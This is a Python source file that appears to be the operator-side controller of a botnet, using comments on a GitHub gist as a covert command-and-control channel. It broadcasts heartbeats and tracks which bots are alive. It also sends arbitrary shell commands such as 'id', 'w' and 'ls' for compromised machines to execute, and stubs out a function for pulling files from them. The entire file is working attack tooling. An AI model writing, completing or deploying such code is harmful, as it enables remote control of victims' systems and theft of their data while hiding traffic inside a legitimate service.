import argparse
import time
import utils
from utils import Command
import log

SHOW_INFO = True
LOGFILE = '.controllog'

LAST_COMMENT = 0


# TODO: better message
def error(args):
    print("Bad input")
    print(args)


def heartbeat():
    global LAST_COMMENT
    LAST_COMMENT = utils.get_last_comment_id()
    log.add_log_entry(SHOW_INFO, LOGFILE, log.InitEntry(LAST_COMMENT))

    while True:
        send_heartbeat()
        if SHOW_INFO: print("SLEEP\n")
        time.sleep(utils.REFRESH_DELAY)
        check_bots()


def send_heartbeat():
    return send_command(utils.BROADCAST, Command.HEARTBEAT, "", True)


def check_bots():
    global LAST_COMMENT
    data, LAST_COMMENT = utils.get_fresh_comments(LAST_COMMENT)

    alive = set()
    for comment in data:
        isctrl, bot, cmd, d, r = utils.parse_msg(comment['body'])
        if isctrl: continue
        alive.add(bot)
        handle_response(bot, cmd, d)
    
    log.add_log_entry(SHOW_INFO, LOGFILE, log.AliveBots(alive))
    return alive


def handle_response(bot, cmd, data):
    if cmd != Command.HEARTBEAT:
        log.add_log_entry(SHOW_INFO, LOGFILE, log.Response(bot, cmd, data))


def send_command(bot, cmd, data, respond):
    comment = construct_command(bot, cmd, data, respond)
    response = utils.post_gist_comment(comment)
    log.add_log_entry(SHOW_INFO, LOGFILE, log.Command(bot, cmd, data, respond))
    return response


# TODO rework
def construct_command(bot, cmd, data, respond):
    return utils.DELIM \
        + str(int(True)) + utils.DELIM \
        + str(bot) + utils.DELIM \
        + cmd.name + utils.DELIM \
        + data + utils.DELIM \
        + str(int(respond)) + utils.DELIM


def request_file(bot, filepath, respond):
    # TODO
    return


def main(args):
    if args.command == 'heartbeat' or args.command == 'hb':
        return heartbeat()

    respond = not args.noresponse

    if args.command == 'cmd' or args.command == 'exec':
        if (args.data == ''): return error(args)
        return send_command(args.bot, Command.CMD, args.data, respond)

    elif args.command == 'w':
        return send_command(args.bot, Command.CMD, 'w', respond)

    elif args.command == 'ls':
        return send_command(args.bot, Command.CMD, 'ls ' + args.data, respond)

    elif args.command == 'id':
        return send_command(args.bot, Command.CMD, 'id', respond)

    elif args.command == 'req_file' or args.command == 'rf':
        if (args.data == ''): return error(args)
        return request_file(args.bot, args.data, respond)


if __name__ == "__main__":
    utils.init_config()

    parser = argparse.ArgumentParser()
    parser.add_argument('command', choices=[
            'heartbeat', 'hb',
            'cmd', 'exec',
            'w', 'ls', 'id',
            'req_file', 'rf',
        ])
    parser.add_argument('-d', '--data', default='')
    parser.add_argument('-b', '--bot', default=0, type=int)
    parser.add_argument('-s', '--silent', action='store_true')
    parser.add_argument('-n', '--noresponse', action='store_true')

    args = parser.parse_args()
    if args.silent: SHOW_INFO = False

    main(args)
